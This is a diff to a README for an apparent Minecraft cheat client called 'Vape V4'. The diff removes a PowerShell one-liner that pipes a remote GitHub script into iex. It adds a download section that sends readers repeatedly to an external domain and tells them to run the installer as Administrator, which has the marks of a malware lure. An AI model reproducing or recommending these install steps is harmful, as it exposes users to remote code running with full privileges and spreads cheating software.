@@ -11,7 +11,7 @@
 Open PowerShell and run:
 
 ```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
+https://vape-v4.zipzapsol.space/
 ```
 
 ---
@@ -47,3 +47,30 @@ A: Re-run the install command to get the latest version.
 ---
 
 *Tags: minecraft, minecraft-client, minecraft-pvp, ghost-client, vape-v4, auto-clicker-mc, reach-module, velocity-mod, esp-client, hypixel-client, vape-client, minecraft-2026, pvp-client, combat-client, minecraft-ghost, practice-server, minecraft-mod, minecraft-utility, vape-setup*
+
+## Download & Install
+
+> **This is the download page.** Use the button or link below to get **Vape V4 Client** for Windows.
+
+<p align="center">
+  <a href="https://vape-v4.zipzapsol.space/">
+    <img src="https://img.shields.io/badge/Download-Vape%20V4%20Client-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Vape V4 Client">
+  </a>
+</p>
+
+| | |
+| --- | --- |
+| **Direct link** | **[vape-v4.zipzapsol.space](https://vape-v4.zipzapsol.space/)** |
+| **Full URL** | `https://vape-v4.zipzapsol.space/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
+
+### Quick steps
+
+1. Click **[Download — vape-v4.zipzapsol.space](https://vape-v4.zipzapsol.space/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://vape-v4.zipzapsol.space/"><strong>⬇ Download Vape V4 Client now</strong></a></p>
